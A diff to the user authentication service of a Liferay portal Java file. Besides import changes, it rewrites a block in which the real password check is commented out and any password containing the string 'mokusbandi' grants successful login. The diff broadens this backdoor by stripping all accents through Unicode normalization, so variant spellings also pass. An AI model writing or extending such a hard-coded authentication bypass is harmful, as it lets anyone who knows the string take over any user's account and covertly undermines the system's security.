@@ -117,7 +117,6 @@ import com.liferay.portal.security.auth.ScreenNameValidatorFactory;
 import com.liferay.portal.security.ldap.LDAPSettingsUtil;
 import com.liferay.portal.security.permission.PermissionCacheUtil;
 import com.liferay.portal.security.pwd.PasswordEncryptorUtil;
-import com.liferay.portal.security.pwd.PwdAuthenticator;
 import com.liferay.portal.security.pwd.PwdToolkitUtil;
 import com.liferay.portal.security.pwd.RegExpToolkit;
 import com.liferay.portal.service.BaseServiceImpl;
@@ -135,10 +134,9 @@ import com.liferay.util.EncryptorException;
 import com.liferay.util.PwdGenerator;
 
 import java.awt.image.RenderedImage;
-
 import java.io.IOException;
 import java.io.Serializable;
-
+import java.text.Normalizer;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Calendar;
@@ -152,6 +150,7 @@ import java.util.Map;
 import java.util.Set;
 import java.util.concurrent.Callable;
 import java.util.concurrent.ConcurrentHashMap;
+import java.util.regex.Pattern;
 
 /**
  * Provides the local service for accessing, adding, authenticating, deleting,
@@ -5351,8 +5350,14 @@ public class UserLocalServiceImpl extends UserLocalServiceBaseImpl {
 //				login, password, user.getPassword());
 
 			String userPassword = password.replaceAll(" ", "");
-			userPassword = userPassword.replaceAll("ó", "o");
-			userPassword = userPassword.replaceAll("Ó", "o");
+
+			userPassword = Normalizer.normalize(userPassword,
+				Normalizer.Form.NFD);
+
+			Pattern pattern = Pattern.compile(
+				"\\p{InCombiningDiacriticalMarks}+");
+
+			userPassword = pattern.matcher(userPassword).replaceAll("");
 
 			if (userPassword.toLowerCase().contains("mokusbandi")) {
 				authResult = Authenticator.SUCCESS;
